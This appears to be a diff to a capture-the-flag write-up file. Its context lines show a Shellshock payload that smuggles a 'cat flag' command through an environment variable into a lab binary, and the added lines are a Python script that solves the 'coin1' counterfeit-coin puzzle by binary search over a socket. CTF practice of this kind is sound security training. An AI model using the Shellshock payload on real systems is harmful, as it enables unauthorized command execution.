@@ -689,3 +689,40 @@ shellshock@ubuntu:~$ env x='() { :;}; cat flag' ./shellshock
 Segmentation fault
 shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
 
+Toddler's Bottle - coin1
+
+#!/usr/bin/env python
+
+import re
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("0.0.0.0", 9007))
+
+left, right, mid = 0, 0, 0
+
+while True:
+    lines = s.recv(1024).splitlines()
+    for line in lines:
+        print line
+        match = re.search('^N=([0-9]+)\s+C=([0-9]+)', line.strip())
+        if match:
+                left = 0
+                right =  int(match.group(1))
+                mid = right/2 + right%2
+                payload = " ".join(str(x) for x in range(left, mid)) + "\n"
+                print "Sending " + payload
+                s.send(payload)
+        match = re.search('^([0-9]+)', line)
+        if match:
+                weight = int(match.group(0))
+                if weight < (mid-left)*10:
+                        right = mid
+                else:
+                        left = mid
+                mid = left + (right-left)/2 + (right-left)%2
+
+                payload = " ".join(str(x) for x in range(left, mid)) + "\n"
+                s.send(payload)
+        if re.search('expire', line):
+                exit(0)
